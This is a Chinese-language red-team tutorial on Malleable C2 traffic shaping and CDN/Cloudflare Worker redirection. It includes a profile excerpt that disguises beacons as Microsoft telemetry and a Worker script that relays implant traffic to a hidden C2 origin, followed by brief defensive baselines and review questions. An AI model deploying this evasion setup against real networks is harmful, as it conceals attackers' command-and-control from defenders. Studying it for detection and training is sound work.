# R21.2 Malleable C2 流量特徵自定義與 CDN 隱蔽重定向 (Malleable C2 & CDN Redirection)

---

## 🎯 作戰任務破題 (Tactical Objective & Mental Workflow)

**Malleable C2 流量特徵自定義與 CDN 隱蔽重定向** 的物理本質為**利用可塑性 C2 配置檔 (Malleable C2 Profile) 精確控制 HTTP/HTTPS 請求與回應的 URI 結構、標頭欄位、Cookie 格式及載荷編碼方式，將命令與控制流量 100% 偽裝為合法雲端服務（如 Microsoft Teams, Amazon, Google Analytics），並搭配雲端內容傳遞網路 (CDN) 或 Cloudflare Workers 作為反向代理跳板，對藍隊隱匿真實 C2 伺服器 IP**。在紅隊實戰中，即使對手具備全流量錄包與進階威脅獵捕能力，亦無法從連線目的端與傳輸外觀判定惡意性。

```
[受害主機 Implant] ── 1. 發送偽裝為微軟遙測之 HTTPS 請求: GET /telemetry/v1/client...
        │
        ▼ 2. 連線目標為公有高信譽 CDN 邊緣節點 (如 Cloudflare / CloudFront)
[公有 CDN 邊緣緩衝節點]
        │
        ▼ 3. CDN 根據隱蔽 Host 或路徑規則反向代理轉發
[雲端重定向器 (Apache/Nginx Redirector)] ── (過濾非預期 IP 與沙盒掃描流量)
        │
        ▼ 4. 僅轉發符合 Profile 簽名特徵之合法回連
[核心 C2 伺服器 (Sliver / TeamServer)] ──► 達成對手「見不到真 IP、辨不出惡意流量」的極致隱匿！
```

## 🔬 第一動：Malleable 語法解析器、資料流轉換與 CDN 反向代理物理機制 (Mechanics & Transforms)

### 1. Malleable C2 Profile 語法結構解析
Malleable Profile 允許操作員自由定義數據傳輸過程中的封裝方式：
- **`http-get` 語句塊**：定義 Implant 索取任務時的特徵。
- **`http-post` 語句塊**：定義 Implant 回傳執行結果時的特徵。
- **資料轉換函數 (Transforms)**：
  - `mask`：隨機 XOR 掩碼加密。
  - `netbios` / `netbiosu`：NetBIOS 編碼轉換。
  - `base64url`：URL 安全的 Base64 轉換。
  - `prepend` / `append`：在有效載荷前後添加合法靜態資料。

### 2. CDN 重定向 (CDN-Based Redirector) 原理
- 攻擊者不直接向 Implant 提供真實 C2 IP，而是提供 CDN 節點域名。
- CDN 具有全球分佈的 Anycast IP，且其 IP 網段在各大威脅情報庫中均標記為「高信譽 (High Reputation)」。
- 藍隊 SOC 在排查連線時，僅能看到主機正與合法 CDN 頻繁通訊，難以單憑 IP 發起封鎖。

## ⚡ 第二動：戰術執行與工具鏈操作 (Attack Vectors & Exploitation)

### 1. 偽裝為 Microsoft 遙測服務之 Malleable Profile 定義
```text
# amazon_telemetry.profile 節錄
http-get {
    set uri "/api/v2/telemetry/events";
    client {
        header "Host" "telemetry.microsoft.com";
        header "User-Agent" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36";
        metadata {
            base64url;
            prepend "session_id=";
            header "Cookie";
        }
    }
    server {
        header "Content-Type" "application/json; charset=utf-8";
        output {
            mask;
            base64;
            prepend "{\"status\":\"ok\",\"data\":\"";
            append "\"}";
            print;
        }
    }
}
```

### 2. Cloudflare Workers 極簡 C2 隱蔽重定向腳本
```javascript
// Cloudflare Worker 反向代理 C2 流量
addEventListener('fetch', event => {
    event.respondWith(handleRequest(event.request))
})

async function handleRequest(request) {
    let url = new URL(request.url)
    // 轉發至隱蔽真實 C2 伺服器
    url.hostname = 'c2-origin.internal-backend.net'
    let newRequest = new Request(url, request)
    return fetch(newRequest)
}
```

## 🛡️ 第五動：工程級防禦基線 (Hardening Baselines)

1. **嚴格落實 TLS SNI 與 HTTP Host 標頭一致性校驗**：
   - 在次世代防火牆啟用 Domain Fronting 阻斷功能，比對 TLS Handshake 的 SNI 網域名稱與 HTTP Header 中的 `Host` 是否完全相符，不符者立即切斷連線。
2. **端點網路連線應用程式白名單**：
   - 僅允許企業合規瀏覽器發起對外 HTTPS 連線，禁止非標準自編程式直接出站訪問網際網路。

## 🎯 作戰驗收檢查點 (Operational Checkpoints)

- [ ] **Q1：Malleable C2 Profile 在紅隊通訊體系中的核心作用是什麼？**
  - **戰術思維**：精確塑造 C2 流量外觀，透過插入自定義 URI、標頭、Cookie 及混淆函數，將攻擊流量偽裝為正常 Web 業務或特定軟體 API，逃避特徵碼偵測。
- [ ] **Q2：利用 CDN 作為 C2 重定向器 (Redirector) 能防範藍隊何種反制手段？**
  - **戰術思維**：防範藍隊獲取真實 C2 伺服器的 IP 地址，並利用 CDN 的高信譽 Anycast IP 繞過基於外部 IP 信譽的防火牆黑名單封鎖。
- [ ] **Q3：什麼是網域前置 (Domain Fronting) 攻擊？其依賴的核心協定特性為何？**
  - **戰術思維**：在 TLS SNI 填寫無害高信譽域名（如各大電商），但在 HTTP 應用層的 `Host` 標頭填寫攻擊者控制的真實轉發域名，利用 CDN 邊緣節點依據 Host 標頭路由的特性達成混淆。
- [ ] **Q4：在設計 Profile 時，為何需要為連線注入 Jitter (抖動延遲)？**
  - **戰術思維**：避免以絕對固定間隔發送請求，消除週期性心跳信號，阻斷藍隊 SIEM 透過頻譜分析或連線時間戳記的方差分析識別機器行為。
- [ ] **Q5：藍隊應如何有效識別隱藏在合法 CDN 背後的 Malleable C2 流量？**
  - **戰術思維**：在端點阻斷非白名單進程訪問外網，並在出口網關啟用 SSL 解密，檢測特定 URI 路徑的頻繁請求與異常長度的 Cookie 參數。
